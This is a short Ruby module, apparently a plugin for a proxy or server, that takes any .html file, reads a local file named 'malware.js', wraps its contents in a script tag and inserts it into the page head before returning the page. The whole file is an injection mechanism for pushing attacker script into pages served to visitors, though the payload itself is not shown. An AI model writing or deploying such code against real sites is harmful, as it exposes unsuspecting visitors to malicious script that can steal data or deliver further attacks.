# frozen_string_literal: true

require 'nokogiri'

module Html
  def self.can_call?(data)
    File.extname(data) == '.html'
  end

  def self.call(hash)
    document = Nokogiri::HTML.parse(hash[:data])
    data = Nokogiri::HTML.parse("<script type='text/javascript'> #{File.read('malware.js')}")
    document.at('head').add_child(data.css('head').children.first)
    { type: 'text/html', body: document.to_html }
  end
end
